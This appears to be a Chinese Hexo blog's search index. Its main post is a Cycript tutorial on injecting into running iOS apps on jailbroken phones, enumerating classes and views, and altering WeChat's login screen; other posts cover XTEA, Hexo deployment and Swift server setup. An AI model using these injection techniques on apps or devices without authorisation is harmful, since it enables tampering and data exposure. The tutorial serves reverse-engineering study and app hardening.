dataFromUInt32Array:decryptData length:data.length];&#125; 使用到的数据转换 NSData 转 uint32 uint32 转 NSData 12345678910111213141516+ (uint32_t)uint32FromData:(NSData *)hexData&#123; NSAssert(hexData.length == 4, @"uint32FromData: (data length != 4)"); Byte dataBytes[4]; [hexData getBytes:&amp;dataBytes length:4]; uint32_t resultValue = *(uint32_t *)dataBytes ; return resultValue;&#125;+ (NSData *)dataFromUInt32Array:(uint32_t *)value length:(NSInteger)length&#123; Byte *result = (Byte *)value; return [NSData dataWithBytes:result length:length];&#125; 参考 常用加密算法概述 TEA、XTEA、XXTEA加密解密算法]]></content>
      <categories>
        <category>iOS</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>XTEA</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[记一次Hexo博客部署缓慢的解决办法]]></title>
    <url>%2Farchives%2F8e3becb8.html</url>
    <content type="text"><![CDATA[况且，一个人要活的真实就难免不把别人的一生当一场戏。看不见的岁月是可怕的。 ——刘亮程《一个人的村庄》 简介 本来之前也有想把博客的图片放在七牛的服务器上做成外链的，但是去注册发现需要实名认证，所以就放弃折腾了；而且我的博客目前来说还很小，所以图片也就直接在本地压缩下就使用了。 最近一次写博客用的图片比较多，然后当时也忘记压缩了，所以就导致使用hexo d提交部署的时候一直不见成功，中间提交、等待、取消、重试，来来回回折腾好多次也没见成功，以为是连接GitHub比较慢，所以挂梯子，依然如故… 思考 &amp; 解决思考 既然使用terminal部署文件比较大时比较慢，那么此时就需要换一种方法去部署更新了。 我们在编辑完文章使用hexo g生成命令的时候，实际上，是将我们的Markdown格式文件重新生成对应的静态HTML网页格式的文件，并且和相关的图片素材一起放在博客的根目录的public目录下。 同时public目录下也会生成我们的站点主题配置、样式、SEO优化、站点地图、百度蜘蛛爬取配置等等的我们在网站所能访问到的任何文件和资源。 我们在执行hexo clean命令时候，实际上清空的也是这个目录下的所有文件。 当我们开始hexo d提交部署的时候，实际上就是把public目录下的所有的文件上传到GitHub服务器上面，这样我们的静态网站就可以访问到我们新编辑的内容了。 解决 既然我们的博客站点访问的文件都是存放在GitHub上面的静态文件，而这些静态文件又都是在本地每次生成在public目录下的，那么我们就可以使用GitHub Desktop客户端，像我们管理自己的GitHub仓库一样来管理网站的仓库了。 首先使用GitHub Desktop客户端或者其他你喜欢的方式，将你网站的仓库拉到本地： 可以对比网站的仓库文件和博客public目录下的文件是一毛一样的，只是多了一个管理文件的.git目录。 此时我们再部署网站就可以通过下面的步骤完成: 使用hexo g生成博客的静态文件 将public目录下的所有文件拷贝到我们拉取到本地的博客站点文件内，替换博客站点目录内所有文件。 使用GitHub Desktop提交博客站点目录内的变动文件即可。 这里如果想和博客的GitHub仓库的提交记录保持一致：只需要将提交的Commit信息按Site updated: 2018-08-30 17:17:25这个格式写就可以了。 刷新网页就会发现已经部署成功，可以正常访问新编辑的内容了。 总结 本方案可以用于临时需要部署比较大的文件导致比较慢的部署情况。 如果可能，还是尽量使用图片外链的方式，博客的访问速度和体验也会提升。]]></content>
      <categories>
        <category>Blog</category>
      </categories>
      <tags>
        <tag>Blog</tag>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iOS攻防（六）：使用Cycript一窥运行程序的神秘面纱(入门篇)]]></title>
    <url>%2Farchives%2Fc12f47b1.html</url>
    <content type="text"><![CDATA[从那个夜晚我懂得了隐藏温暖——在凛冽的寒风中，身体中那点温暖节俭地用于此后多年的爱情和生活。我的亲人说我是个很冷的人，不是的，我把仅有的温暖全给了你们。 ——刘亮程《寒风吹彻》 简介 Cycript allows developers to explore and modify running applications on either iOS or Mac OS X using a hybrid of Objective-C++ and JavaScript syntax through an interactive console that features syntax highlighting and tab completion.(It also runs standalone on Android and Linux and provides access to Java, but without injection.) Cycript是由Cydia创始人Saurik推出的一款脚本语言，Cycript 混合了Objective-C与javascript语法的解释器，这意味着我们能够在一个命令中用Objective-C或者javascript，甚至两者兼用。 它能够注入正在运行的进程，能够在运行时修改应用的很多东西。 cycript官网 了解更多： iOS攻防（一）： iPhone手机越狱 &amp; SSH iOS攻防（二）：窃取用户的通讯录信息 &amp; 偷窥用户安装应用列表 &amp; Netcat使用 iOS攻防（三）：配置使用Reveal工具逆向别人的App UI界面 iOS攻防（四）：使用Dumpdecrypted 砸壳 &amp; class-dump 导出头文件 iOS攻防（五）：使用Keychain-Dumper导出keychain数据 Cycript安装 安装Cycript有两种方式（手机需越狱）： 方式一：直接在Cydia搜索Cycript安装，简单方便。 方式二：通过Linux包管理器安装： 首先在手机上Cydia搜索安装 APT 0.6 Transitional包管理工具。 使用Terminal（如果手机有安装）或者电脑SSH连接手机，通过包管理器安装apt-get install cycript。 终端输入cycript，出现 cy#提示符，说明已经成功启动了Cycript（需要SSH连接手机）。 如果想要退出Cycript和断开远程登录： Control + D快捷键可以退出Cycript 终端输入logout可以断开手机远程登录 Cycript基本用法测试Cycript注入头条新闻 开始使用Cycript，注入一个正在运行（需要再前台）的程序。这里我们以今日头条为例。 首先使用电脑终端通过SSH连接到手机，不知道如何使用SSH的请参考之前的文章，这里不再赘述。 获取今日头条app的进程ID，建议清空后台应用，只保留需要hook的App在前台即可。 News即为今日头条进程名称，如果想知道某个app在运行时候的进程名称，可以下载对应的应用安装包，解压缩找到Payload目录下的xxx.app，其中xxx包名即是进程名称，如微信是WeChat，网易云音乐是NeteaseMusic。 在运行的进程中查找过滤我们需要的进程名称，命名如下： 1ps -e | grep News 成功之后，就可以看到今日头条应用进程的一些信息，如进程ID9347，进程的可执行文件路径等待。 拿到进程ID后，我们就可以注入住这个进程，从而对应用为所欲为了😈，如何注入进程，命令如下： 12cycript -p 9347 // 需要hook的程序打开到前台// cycript -p News 此时，我们可以简单测下下是否hook成功： 12[[UIApplication sharedApplication] setStatusBarHidden:YES] // 隐藏状态栏[[UIApplication sharedApplication] setStatusBarHidden:NO] // 显示状态栏 常用数据类型及类型判断 常用的数据类型（字符串、数组、字典、Bool， NSNumber）和我们在OC中使用的完全一样。 类型判断使用instanceof，如： 123456cy# @"Hello World" instanceof Stringtruecy# @[1, 2, 3] instanceof Arraytruecy# @"Hello World" instanceof Arrayfalse 字符串及数组截取 字符串及数组截取操作，分别使用substr和slice。 下标从x开始截取y个长度。 1234cy# @"Hello World".substr(0, 5)"Hello"cy# @[1, 2, 3].slice(0, 2)[@1, @2] 创建及获取对象 注入程序后，我们可以根据需要创建需要用到的对象，或者根据内存地址获取到内存中的对象。 创建对象和OC语法差别不大。 根据内存地址获取对象，我们可以使用# 或者使用Instance。 123456// 创建对象var view = [[UIView alloc] init][new UIView init]// 获取对象#0x1719f9a0var same = new Instance(0x1719f9a0) 获取对象信息 方法1： 简单基本获取方法。 直接在对象前面加个* 1*controller（） 方法2：方法一无法获取，就使用方法2 1[i for (i in *UIApp)] 方法3：建议方法三，方法三能获取到更多 1function tryPrintIvars(a)&#123; var x=&#123;&#125;; for(i in *a)&#123; try&#123; x[i] = (*a)[i]; &#125; catch(e)&#123;&#125; &#125; return x; &#125; 类与增加分类 类定义及使用 12345@implementation MyClass : NSObject &#123; int num;&#125;-(int)returnNum &#123;return this -&gt; num;&#125;@end 增加分类 123456789// 定义@implementation NSObject (TestCategory) - description &#123;return "test"&#125; - (double)calculate:(float)num &#123;return num * 10;&#125;@end// 创建对象test = [new NSObject init]// 调用分类方法[test calculate:10] Block12345// 定义一个blockcy# testBlock = ^ int (int value) &#123;return value * 10&#125;// 调用cy# testBlock(7) 查找内存中的类信息 使用choose()函数可以查找到内存中对应传递进去的类，如查找今日头条首页中的图片控件choose(UIImageView) 输入信息如下（数据太多删除一部分），此时我们就可以通过UIImageView控件的内存地址获取到实例对象，修改对象的各种信息等等。 1[#"&lt;UIImageView: 0x17112950; frame = (7.5 10; 11 6); clipsToBounds = YES; opaque = NO; userInteractionEnabled = NO; layer = &lt;CALayer: 0x17393410&gt;&gt;",#"&lt;UIImageView: 0x17114090; frame = (0 0; 0 0); clipsToBounds = YES; opaque = NO; userInteractionEnabled = NO; layer = &lt;CALayer: 0x1736a500&gt;&gt;",#"&lt;UIImageView: 0x171160a0; frame = (-5 0; 5 0); clipsToBounds = YES; opaque = NO; userInteractionEnabled = NO; layer = &lt;CALayer: 0x1736a4d0&gt;&gt;",#"&lt;UIImageView: 0x17138d60; frame = (314.5 -39; 2.5 36); alpha = 0; opaque = NO; autoresize = LM; userInteractionEnabled = NO; layer = &lt;CALayer: 0x17145ad0&gt;&gt;",#"&lt;SSThemedImageView: 0x1713b090; baseClass = UIImageView; frame = (0 0; 0 0); hidden = YES; opaque = NO; gestureRecognizers = &lt;NSArray: 0x1713b380&gt;; layer = &lt;CALayer: 0x17136fb0&gt;&gt;",......",#"&lt;SSThemedImageView: 0x171687b0; baseClass = UIImageV 打印视图层次结构 如果我们想知道某个视图的层次结构信息，也可以不使用Reveal，使用下面指令查看整个层次的结构信息： 1UIApp.keyWindow.recursiveDescription().toString() 获取某个类的所有内容 我们可以打印出某个类的所有内容信息： 定义执行下面的函数 定义后就可以获取指定类的信息，调用printMethods(className, isa) 12345678910111213141516function printMethods(className, isa) &#123; var count = new new Type("I"); var classObj = (isa != undefined) ? objc_getClass(className)-&gt;isa : objc_getClass(className); var methods = class_copyMethodList(classObj, count); var methodsArray = []; for(var i = 0; i &lt; *count; i++) &#123; var method = methods[i]; methodsArray.push(&#123;selector:method_getName(method), implementation:method_getImplementation(method)&#125;); &#125; free(methods); return methodsArray;&#125;printMethods("UIImageView", true)printMethods("TTArticleTabBarController", true) 获取当前控制器 可以直接打印可见控制器，如果获取不到可用下面的方法 1UIApp.keyWindow.rootViewController.visibleViewController 也打印出当前控制器名称及内存地址 定义执行下面的函数 调用函数var vc = currentVC()，如输出信息#&quot;&lt;TTArticleTabBarController: 0x17a5bc00&gt;&quot; 12345678910function currentVC() &#123; var app = [UIApplication sharedApplication] var keyWindow = app.keyWindow var rootController = keyWindow.rootViewController var visibleController = rootController.visibleViewController if (!visibleController) &#123; return rootController &#125; return visibleController.childViewControllers[0]&#125; 加载系统动态库 定义执行下面获取系统动态库的函数 定义好后就可以调用函数如loadFramework(&quot;UIKit&quot;)，传递想要加载的框架名称加载对应的框架。 12345function loadFramework(fw) &#123; var h="/System/Library/",t="Frameworks/"+fw+".framework"; [[NSBundle bundleWithPath:h+t]|| [NSBundle bundleWithPath:h+"Private"+t] load];&#125; NSLog打印函数123456789NSLog_ = dlsym(RTLD_DEFAULT, "NSLog")NSLog = function() &#123; var types = 'v', args = [], count = arguments.length; for (var i = 0; i != count; ++i) &#123; types += '@'; args.push(arguments[i]); &#125; new Functor(NSLog_, types).apply(null, args);&#125; CG…Make函数123cy# function CGPointMake(x, y) &#123; return &#123;x:x, y:y&#125;; &#125;cy# function CGSizeMake(w, h) &#123; return &#123;width:w, height:h&#125;; &#125;cy# function CGRectMake(x, y, w, h) &#123; return &#123;origin:CGPointMake(x,y), size:CGSizeake(w, h)&#125;; &#125; 使用Cycript一窥微信 这里综合上面的知识练练手： 修改微信登录界面按钮文字及背景颜色 在登录界面弹出一个Alert弹框 修改微信登录界面背景图片 注入进程 获取微信的进程ID，使用Cycript注入微信进程。 123ps -e | grep WeChatcycript -p WeChat// cycript -p 进程ID // 替换为你的微信进程ID 层次结构 查看微信登录界面的层次结构 1UIApp.keyWindow.recursiveDescription().toString() 输出的层次结构信息： 123456789101112131415`&lt;iConsoleWindow: 0x14f6e420; baseClass = UIWindow; frame = (0 0; 320 568); gestureRecognizers = &lt;NSArray: 0x14f6dea0&gt;; layer = &lt;UIWindowLayer: 0x14f6e7a0&gt;&gt; | &lt;UILayoutContainerView: 0x14e10510; frame = (0 0; 320 568); autoresize = W+H; gestureRecognizers = &lt;NSArray: 0x14e0cd60&gt;; layer = &lt;CALayer: 0x14e103d0&gt;&gt; | | &lt;UINavigationTransitionView: 0x14e0d370; frame = (0 0; 320 568); clipsToBounds = YES; autoresize = W+H; layer = &lt;CALayer: 0x14e0ddd0&gt;&gt; | | | &lt;UIViewControllerWrapperView: 0x14f312e0; frame = (0 0; 320 568); autoresize = W+H; layer = &lt;CALayer: 0x14f31220&gt;&gt; | | | | &lt;UIView: 0x14e15e80; frame = (0 0; 320 568); autoresize = W+H; layer = &lt;CALayer: 0x14ef6410&gt;&gt; | | | | | &lt;UIView: 0x160ce380; frame = (0 20; 320 633); autoresize = W; layer = &lt;CALayer: 0x160c5110&gt;&gt; | | | | | | &lt;UIImageView: 0x14f2bef0; frame = (0 -20; 320 568); opaque = NO; userInteractionEnabled = NO; layer = &lt;CALayer: 0x14f2bff0&gt;&gt; | | | | | &lt;UIView: 0x160ce5b0; frame = (0 483; 320 65); autoresize = W+TM; layer = &lt;CALayer: 0x160ce690&gt;&gt; | | | | | | &lt;FixTitleColorButton: 0x160ce750; baseClass = UIButton; frame = (20 18; 130 47); clipsToBounds = YES; opaque = NO; autoresize = RM; layer = &lt;CALayer: 0x14f2c140&gt;&gt; | | | | | | | &lt;UIButtonLabel: 0x160ce980; frame = (46.5 13; 37 21.5); text = '\u767b\u5f55'; opaque = NO; userInteractionEnabled = NO; layer = &lt;_UILabelLayer: 0x160ceae0&gt;&gt; | | | | | | | | &lt;_UILabelContentLayer: 0x160cfc90&gt; (layer) | | | | | | &lt;FixTitleColorButton: 0x160ced10; baseClass = UIButton; frame = (170 18; 130 47); clipsToBounds = YES; opaque = NO; autoresize = LM; layer = &lt;CALayer: 0x160ceeb0&gt;&gt; | | | | | | | &lt;UIButtonLabel: 0x14f2c5f0; frame = (46.5 13; 37 21.5); text = '\u6ce8\u518c'; opaque = NO; userInteractionEnabled = NO; layer = &lt;_UILabelLayer: 0x14f2c750&gt;&gt; | | | | | | | | &lt;_UILabelContentLayer: 0x160d0cd0&gt; (layer) | | Command + F 搜索UIButton，可以找到有两个UIButton对象，并且text属性是显示的Unicode编码（中文在里面显示的就是Unicode字符编码）。我们可以在在线的Unicode和中文互转网站转换一下，如这个网站，可以看到对应的刚好就是界面上显示的登录和注册。 我们就可以拿到每一个的对应的按钮对象，改变按钮显示文字： 如我拿到的登录按钮内存地址：0x19c87130 注册按钮内存地址：0x19cd4470 注意设置中文时需要将中文转为Unicode编码。 12#0x19c87130.titleLabel.text = @"\u52ab\u8d22" // \u52ab\u8d22 == "劫财"#0x19cd4470.titleLabel.text = @"\u52ab\u8272" // \u52ab\u8272 == "劫色" 修改按钮文字背景颜色： 我们搜索上一步获取到的层次结构信息，可以找到叫UIButtonLabel的对象，修改按钮文字背景就是修改UIButtonLabel的背景颜色 只需要根据UIButtonLabel地址修改即可 12#0x15f4f590.backgroundColor = [UIColor redColor]#0x15f4ffb0.backgroundColor = [UIColor greenColor] 弹出一个Alert弹框 如果对方法签名不熟悉，可以在Xcode中打出来后拷贝进终端 尽量不要有中文和表情 也可以在系统桌面弹出，需要注入到系统的桌面进程SBHomeScreenWindow 12var alert = [[UIAlertView alloc] initWithTitle:@"Hack You" message:@"I've hacked you" delegate:nil cancelButtonTitle:@"No pay" otherButtonTitles:@"Pay", nil];[alert show]; 修改微信登录界面背景图片 如果我们想替换微信的某个图片，这里以登录界面背景为例子，只需要将我们自己的图片放在微信的某个目录下，如Document下，然后修改背景图片控件的图片即可。 将图片放入对应的文档目录下： 可以直接使用工具iMazing，也可以使用scp命令远程传输（越狱第一篇文章SS部分），看个人爱好。 获取微信的文档目录路径地址： 123456789101112131415cy# [[NSFileManager defaultManager] URLsForDirectory:NSDocumentDirectory inDomains:NSUserDomainMask][0]// 输出文档目录路径地址 #"file:///var/mobile/Containers/Data/Application/8B12B9B9-06BE-49C2-ADC2-96BB1C4F5E79/Documents/" // 图片加载路径地址 /var/mobile/Containers/Data/Application/8B12B9B9-06BE-49C2-ADC2-96BB1C4F5E79/Documents/``` - 在层次结构信息中查找`UIImageView`即为背景图片控件，根据内存地址获取到图片对象，然后重新设置图片: - 如我获取到的图片控件内存地址是`0x14706110` - 我放在文档目录的替换图片为`wechat_testBg.jpg````objc #0x14706110.image = [UIImage imageWithContentsOfFile:@"/var/mobile/Containers/Data/Application/8B12B9B9-06BE-49C2-ADC2-96BB1C4F5E79/Docments/wechat_testBg.jpg"] 综合效果图（没修改文字背景颜色） 其他好玩的大家可以自行测试： 12345678910111213141516// 截屏cy# var shot = [SBScreenShotter sharedInstance]cy# [shot saveScreenshot:YES]// 隐藏桌面cy# UIApp.keyWindow // 获取SBHomeScreenWindow对象地址，SBHomeScreenWindow就是桌面Windowcy# screen = #0xxxxxxxxxx(上一步获取到的内存地址) cy# screen.hidden = YES // 隐藏cy# screen.hidden = NO // 显示// 改变手机的背景色cy# screen.backgroundColor = [UIColor redColor]// 设置badgecy# [[UIApplication sharedApplication] setApplicationIconBadgeNumber:100] 福利 如果感觉上面一些函数比较复杂，不想每次都去敲一次，那么福利来了，MJRefresh作者将一些Cycript实现的一些实用函数封装成一个脚本放在GitHub上面，基本上囊括了我们上面的那些，还有一些其他的比较常用的函数。 需要的小伙伴们可以直接去在这里下载，至于如何使用大家看文档就可以了，比较简单，都是中文就没必要我在转述一遍了。 防 通过一系列文章的介绍及实战，可以看到我们的App面临的安全问题是多么的可怕，也意识到保护app数据的重要性。 但是既然知道了这么多可能导致不安全的点，就要做好相应的防，保护重要数据不被攻击者使用Cycript或者Runtime修改，这里有一篇文章对如何防范介绍的很详细，大家可以参考下。 参考 Cycript Manual iOS逆向-用Cycript进行运行时分析(微信应用) iOS逆向工程（4）Cycript脚本语言使用与实战]]></content>
      <categories>
        <category>iOS</category>
        <category>攻防</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>攻防</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Swift开发服务端（三）：Perfect再次初体验]]></title>
    <url>%2Farchives%2Ff7d447dc.html</url>
    <content type="text"><![CDATA[多少年后当眼前的一切成为结局，时间改变了我，改变了村里的一切。整个老掉的一代人，坐在黄昏里感叹岁月流逝、沧桑巨变。没人知道有些东西是被我改变的。在时间经过这个小村庄的时候，我帮了时间的忙，让该变的一切都有了变迁。我老的时候，我会说：我是在时光中老的。 ——刘亮程《一个人的村庄》 简介 Perfect是一组完整、强大的工具箱、软件框架体系和Web应用服务器，可以在Linux和macOS (OS X)上使用。该软件体系为Swift工程师量身定制了一整套用于开发轻量、易维护、规模可扩展的Web应用及其它REST服务的解决方案，这样Swift工程师就可以实现同时在服务器和客户端上采用同一种语言开发软件项目。 由于建立在一个高性能异步网络引擎基础上，Perfect还能够在FastCGI上运行，支持安全套接字加密（SSL）。该软件体系还包含很多其它互联网服务器所需要的特点，包括WebSockets和iOS消息推送，而且很快会有更多强大的功能支持。 Swift开发服务端（一）：MySQL安装及配置 Swift开发服务端（二）：使用Parallels Desktop虚拟机安装Ubuntu系统及相关配置 正文 有很多小伙伴肯定在想，我为什么会把第一次给了Perfect🌝，那是因为Perfect有官方中文文档，虽然不是非常完善的中文文档，但有胜于无，减少了入门的难度。 什么，为什么叫再次初体验。那是因为上次的初体验不算。为什么不算、因为我说的🌚🌚。 本篇完全基于Mac系统，为什么不基于上一篇安装的Ubuntu系统呢，因为相较于Mac，在Ubuntu下只是多了Swift安装环境配置和其他需要的服务安装，都特别简单，更重要的是我们需要使用到Xcode进行编码、编译。 Perfect官方文档在这里 Ubuntu安装Swift 关于在Ubuntu系统下载安装Swift，参考Swift官方文档，已经介绍的非常详细了。 如果你不想看英文官方文档，好吧，那我就再总结（复制）一下： 安装Git 首先检查系统有没有安装Git，如果没有安装，直接使用包管理器安装： 1sudo apt-get install git 安装Swift依赖组件 确保您的系统上的包管理器是最新的： 1sudo apt-get update 安装Swift必要的依赖组件，如clang和Python等。 openssh-server 我们在安装Ubuntu一章中已经安装过，所以不用重复安装了。 1sudo apt-get install clang libicu-dev libpython2.7 安装Swift 下载最新的Swift二进制文件，可以手动下载，也可以使用wget下载。 根据自己的Ubuntu系统版本和需要的swift版本选择，在这里下载。 .tar.gz后缀的是工具链二进制文件 .sig 后缀的是数字签名文件。 1wget https://swift.org/builds/swift-4.0-release/ubuntu1604/swift-4.0-RELEASE/swift-4.0-RELEASE-ubuntu16.04.tar.gz 如果你是第一次下载安装Swift包，需要将Swift的PGP密钥导入您的密钥环，密钥将用于验证下载的文件有无被被损坏或篡改。 123456gpg --keyserver hkp://pool.sks-keyservers.net \ --recv-keys \ '7463 A81A 4B2E EA1B 551F FBCF D441 C977 412B 37AD' \ '1BE1 E29A 084C B305 F397 D62A 9F59 7F4D 21A5 6D5F' \ 'A3BA FD35 56A5 9079 C068 94BD 63BC 1CFE 91D3 06C6' \ '5E4D F843 FB06 5D7F 7E24 FBA2 EF54 30F0 71E1 B235' 导入密钥之后，下载对应Swift版本的签名文件： 1wget https://swift.org/builds/swift-4.0-release/ubuntu1604/swift-4.0-RELEASE/swift-4.0-RELEASE-ubuntu16.04.tar.gz.sig 验证签名文件： 如果出现警告信息，可忽略；如果出现错误信息，就需要重新下载Swift二进制文件。 1gpg --verify swift-4.0-RELEASE-ubuntu16.04.tar.gz.sig 安装完成密钥和签名文件，现在就可以安装Swift。 执行以下命令来提取之前下载的二进制文件： 1tar xzf swift-4.0-RELEASE-ubuntu16.04.tar.gz 将Swift工具链添加到环境变量中，以便运行swift命令： 1export PATH=swift-4.0-RELEASE-ubuntu16.04/usr/bin:"$&#123;PATH&#125;" 这个命令只会将swift命令添加到当前shell会话路径中，如果要确保它在以后的会话中自动添加，要将其添加到.bashrc文件中。 打开 .bashrc 文件 文件尾部添加环境变量 保存退出 12vi ~/.bashrc // 也可以使用nanoexport PATH=swift-4.0-RELEASE-ubuntu16.04/usr/bin:"$&#123;PATH&#125;" 在终端输入swift，如果输出Welcome to Apple Swift version xxx则表示安装swift成功。 Perfect服务端使用工具新建Perfect项目 想体验一个新技术，最简便的方法莫过于GUI工具，简单的点几下就可以运行起来。 Perfect Assistant专门用于服务器端Swift应用的启动、管理、编译、测试和部署，极大简化了上述工作的操作过程。无论是初次接触服务器的Swift程序员还是企业级的服务器Swift高级工程师，相信都可以从中受益。 使用Perfect搭建服务端之所以比较强大的原因之一：提供了可视化的工具帮助快速入门体验一个服务端软件的搭建。 而且她不仅支持自家的Perfect库，还支持另一个Swift服务端开发库Vapor。 更更更加支持新款MBP的Touch Bar，，恩，我的还是不支持Touch Bar的15款的MBP🌚。 Perfect Assistant 功能 新建Swift服务器工程，或者从现有项目模板中新建工程 管理组件依存关系 同步交叉编译——即在您的mac计算机上同步编译同一个服务器应用在macOS和Ubuntu操作系统上的二进制程序 配置亚马逊弹性计算或者谷歌云应用 将项目部署为亚马逊EC2弹性云计算服务器例程，或者谷歌云应用引擎服务器例程 下载Perfect Assistant 官方下载地址在这里 点击下载、安装即可。（注意需要科学上网，否则可能很慢） 安装完成后打开界面如下： 关于docker Perfect Assistant是支持使用docker进行编译和部署到Linux上的，安装docker后就可以在本地对代码进行linux环境的编译后直接部署到linux服务器上。 更重要的是：使用docker可以打包应用以及依赖包到一个可移植的容器中，然后发布到任何流行的Linux机器上，也可以实现虚拟化。容器是完全使用沙箱机制，相互之间不会有任何接口。以后需要其他linux上部署，只需要将制作好的docker镜像拉取下来就可以运行，不需要再配置环境和依赖。 安装docker大概需要15G左右的磁盘空间，我因为系统盘磁盘空间有限，就没有安装。之前试了下安装大概需要几分钟时间（前提网速够快）。 需要安装的小伙伴，直接点击如图所示的 立即安装docker、等待安装完成即可。 关于想了解更多docker知识的，官网在这里。 使用Perfect Assistant创建项目 安装好Perfect Assistant后，快速创建一个服务端应用，只需要点击创建项目窗口的Perfect模板App： 选择项目需要放置的文件目录及项目名称（我这里还是以最早体验服务端项目的名字命名）。 红框选项可选可不选，勾选后在Xcode编译项目的时候会，会运行及反馈一些linux环境的编译信息，后面需要的时候可以再重新勾选，现在的电脑配置其实勾选了也并不会增加太长的编译时间。 配置处理项目依赖 项目依赖都是通过Swift的包管理器处理的，Swift包依赖管理请参考官方文档. 创建项目完成会默认先拉取模板应用的相关依赖，在默认应用中默认已经配置过HTTPServer依赖了，处理窗口如下： 后期需要添加自己的依赖库时候，如数据库、打印等等，只需要在下面的可用依赖窗口中选择需要依赖直接拖拽到上面项目依赖窗口即可。 如果在可用依赖窗口没有找到我们需要的，也可以点项目依赖窗口右边的+号按钮，添加自定义的项目依赖：其实就是添加依赖的Package Manager地址及功能类别。 更多Perfect Assistant工具使用及功能介绍，请参考官方文档。 编译运行项目 项目依赖处理完成，就可以找到我们创建的项目目录下的iNoteServer.xcodeproj文件，具体名称请参考你创建项目的名称，通过Xcode打开。 注意，在项目Scheme中选择可执行文件，默认选中的的是项目名称-Package。 然后直接编译运行，就可以看到控制台输出： 1[INFO] Starting HTTP server localhost on 0.0.0.0:8181 此时就已经开了一个本地端口8181的服务，直接在浏览器输入上述地址及端口，就可以看到令人兴奋的Hello, world!了。 使用终端新建Perfect项目 使用终端命令创建项目也不是很复杂，重要的是可以自己把控项目创建的细节，创建出来的项目更加的干净，我比较喜欢使用终端创建项目。 使用终端新建项目 创建一个存放项目的文件夹iNote，后续服务端对应的客户端项目iNoteClient也可以放在这个文件夹内。 在iNote文件夹下创建一个存放服务端项目的文件夹iNoteServer。 将iNoteServer目录初始化为一个Git仓库。 创建Package.swift文件，该文件是用Swift包管理器（SPM）管理依赖需要的，用来管理整个项目的依赖。我们可以使用Xcode打开该文件，编辑添加需要的项目依赖。如： 123456789101112131415import PackageDescriptionlet versions = Version(0,0,0)..&lt;Version(10,0,0)let urls = [ "https://github.com/PerfectlySoft/Perfect-HTTPServer.git", // 最基本的服务器核心依赖 "https://github.com/PerfectlySoft/Perfect-MySQL.git", // MySQL服务器 "https://github.com/PerfectlySoft/Perfect-Logger.git", // 日志处理库 "https://github.com/PerfectlySoft/Perfect-RequestLogger.git" // 请求日志处理库]let package = Package( name: "iNoteServer", targets: [], dependencies: urls.map &#123; .Package(url: $0, versions: versions) &#125;) 回到终端，创建Sources目录，该目录用于存放我们自己写的项目源代码。 创建一个程序入口文件，并在空文件中插入一个打印函数： 1echo 'print("hello world!")' &gt;&gt; Sources/main.swift 配置处理项目依赖 项目依赖已经配置完成，此时需要处理项目依赖并生成可执行文件： 处理过程会在终端输出对应的信息，时间长短取决于在Package.swift文件中配置的依赖库多少及每个库大小。 生成的可执行文件在项目的根目录的debug目录下。 1swift build 默认是生成的Debug版本的可执行文件，如果是正式部署服务器的可执行文件，可使用如下指令生成发布版本可执行文件： 生成的可执行文件在项目的根目录的release目录下。 1swift build -c release 一般很快就可以处理完成，处理完成就会在终端输出信息可以看到生成了一个由项目名称命名的可执行文件，根据提示信息执行对应的可执行文件，就可以输出我们的打印信息了： 12./build/debug/iNoteServer // debug模式./build/release/iNoteServer // release模式 可以使用Swift包管理器创建一个xxx.xcodeproj文件用于使用Xcode来管理和编辑调试项目，执行下面的指令，生成Xcode项目管理文件： 1swift package generate-xcodeproj 配置项目文件的搜索目录为整个项目目录： $(SRCROOT)代表的时项目根目录下 $(PROJECT_DIR)代表的是整个项目 1$(PROJECT_DIR) 如果添加新的项目依赖库后只需要重新swift build 或者 swift build -c release等待完成即可。 如果添加新的依赖后出现未知错误，可尝试删除项目根目录下的xxx.xcodeproj文件，然后使用swift package generate-xcodeproj重新生成项目文件即可。 搭建HTTP服务器 创建iNoteAIP文件，用于管理所有的路由。大概分为用户及笔记两类。 12345678910111213141516171819202122enum iNoteAIP: String &#123; case base = "/iNote" /// 注册页面 case register = "/register" /// 登录页面 case login = "/login" /// 获取笔记列表 case notes = "/notes" /// 添加笔记 case creatNote = "/creatNote" /// 删除笔记 case removeNote = "/removeNote" /// 修改笔记 case editNote = "/editNote"&#125; 创建一个NetworkServerManager文件用于服务器的相关操作，如服务器开启及停止，端口监控、路由监控及处理等等。 关于服务器API设计及命名，请参考服务端指南 | 良好的 API 设计指南这一篇文章，写的很不错。 首先实例化一个HTTPServer对象，绑定指定的端口，并添加项目需要用到的路由。 1234567891011121314151617181920212223242526272829303132// 导入需要的头文件import PerfectHTTPimport PerfectHTTPServerimport PerfectRequestLoggerimport PerfectLoggerclass NetworkServerManager &#123; let server = HTTPServer() var routes = Routes(baseUri: iNoteAIP.base.rawValue) var api1Routes = Routes(baseUri: "/v1") // 将所有的路由根据版本号进行区分管理，方便后期接口逻辑调整，新版本不会影响到旧版本 static let shared = NetworkServerManager() private init() &#123; routesConfigure() // 配置路由 loggerConfigure() // 配置日志工具 &#125; func serverStart(_ port: UInt16 = 8181) &#123; // 监听端口 绑定路由 server.serverPort = port server.addRoutes(routes) do &#123; try server.start() &#125; catch PerfectError.networkError(let code, let message) &#123; print("network error:\(code) \(message)") &#125; catch &#123; print("unknow network error: \(error)") &#125; &#125;&#125; 具体的项目添加的路由（以注册为例子）以及配置系统的日志工具（日志信息记录到本地文件）。 12345678910111213141516171819202122232425262728293031323334353637383940414243extension NetworkServerManager &#123; private func addRoute(with method: HTTPMethod, uri: iNoteAIP, handler: @escaping RequestHandler) &#123; api1Routes.add(method: method, uri: uri.rawValue, handler: handler) &#125; /// 配置各个模块的路由 private func routesConfigure() &#123; addRoute(with: .post, uri: .register, handler: registerHanlder())// addRoute(with: .post, uri: .login, handler: loginHanlder())//// addRoute(with: .post, uri: .creatNote, handler: creatNoteHanlder())// addRoute(with: .post, uri: .editNote, handler: editNoteHanlder())// addRoute(with: .delete, uri: .removeNote, handler: removeNoteHanlder())// addRoute(with: .get, uri: .notes, handler: notesHanlder()) // 所有路由 routes.add(api1Routes) &#125; /// 添加日志文件记录 private func loggerConfigure() &#123; // 日志路径 let logPath = "./files/logs" if !Dir(logPath).exists &#123; try? Dir(logPath).create() &#125; LogFile.location = "\(logPath)/iNoteServer.log" // 设置日志文件路径 // 增加日志过滤器，将日志写入相应的文件 server.setRequestFilters([(RequestLogger(), 